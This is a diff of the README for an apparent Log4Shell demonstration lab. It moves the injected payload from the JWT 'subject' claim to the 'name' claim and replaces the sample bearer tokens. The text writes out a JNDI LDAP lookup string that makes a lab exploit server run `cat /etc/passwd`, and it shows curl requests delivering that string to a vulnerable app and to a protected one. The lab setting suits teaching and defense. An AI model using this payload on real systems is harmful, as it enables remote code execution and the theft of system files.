@@ -28,7 +28,7 @@ The behavior of the applications can be customized by modifying the [GreetingsSe
 
 The current implementation of the exploit reads malicious LDAP lookup strings and parses a Base64-encoded command that is then executed. For example, the
 malicious string `"${jndi:ldap://log4shell:1389/exec/Y2F0IC9ldGMvcGFzc3dkCg==}"` will instruct the exploit to execute a `cat /etc/passwd` command. The vulnerable
-application logs the value of the `subject` claim in a JWT token, so if the malicious payload is set there, the exploit will be triggered.
+application logs the value of the `name` claim in a JWT token, so if the malicious payload is set there, the exploit will be triggered.
 
 ### Running applications locally
 
@@ -59,7 +59,7 @@ $ curl http://localhost:8080
 Welcome, anonymous!
 Accessing: /
 
-$ curl http://localhost:8080 -H "Authorization: Bearer eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJpc3MiOiJPbmxpbmUgSldUIEJ1aWxkZXIiLCJpYXQiOjE2NDI1ODI2MjIsImV4cCI6MTY3NDExODYyMiwiYXVkIjoid3d3LmV4YW1wbGUuY29tIiwic3ViIjoiJHtqbmRpOmxkYXA6Ly9sb2c0c2hlbGw6MTM4OS9leGVjL1kyRjBJQzlsZEdNdmNHRnpjM2RrQ2c9PX0ifQ.ktEyOh8O3QMH6amqZtPsYHjtDeFVXmgKHLt-s0t2ckw"
+$ curl http://localhost:8080 -H "Authorization: Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJleHAiOjE2NDMyMTY1NTEsImlhdCI6MTY0MzIxMjk1MSwiaXNzIjoidGV0cmF0ZS5pbyIsIm5hbWUiOiIke2puZGk6bGRhcDovL2xvZzRzaGVsbDoxMzg5L2V4ZWMvWTJGMElDOWxkR012Y0dGemMzZGtDZz09fSIsInN1YiI6ImFkbWluIn0.KTpoau4cr75ifcvESisRnwJP6_8fxzLrY2MsvgPBITI"
 Welcome, ${jndi:ldap://log4shell:1389/exec/Y2F0IC9ldGMvcGFzc3dkCg==}!
 Accessing: /
 ```
@@ -109,7 +109,7 @@ $ curl http://localhost:8000
 Welcome, anonymous!
 Accessing: /
 
-$ curl http://localhost:8000 -H "Authorization: Bearer eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJpc3MiOiJPbmxpbmUgSldUIEJ1aWxkZXIiLCJpYXQiOjE2NDI1ODI2MjIsImV4cCI6MTY3NDExODYyMiwiYXVkIjoid3d3LmV4YW1wbGUuY29tIiwic3ViIjoiJHtqbmRpOmxkYXA6Ly9sb2c0c2hlbGw6MTM4OS9leGVjL1kyRjBJQzlsZEdNdmNHRnpjM2RrQ2c9PX0ifQ.ktEyOh8O3QMH6amqZtPsYHjtDeFVXmgKHLt-s0t2ckw"
+$ curl http://localhost:8000 -H "Authorization: Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJleHAiOjE2NDMyMTY1NTEsImlhdCI6MTY0MzIxMjk1MSwiaXNzIjoidGV0cmF0ZS5pbyIsIm5hbWUiOiIke2puZGk6bGRhcDovL2xvZzRzaGVsbDoxMzg5L2V4ZWMvWTJGMElDOWxkR012Y0dGemMzZGtDZz09fSIsInN1YiI6ImFkbWluIn0.KTpoau4cr75ifcvESisRnwJP6_8fxzLrY2MsvgPBITI"
 Access Denied
 ```
 
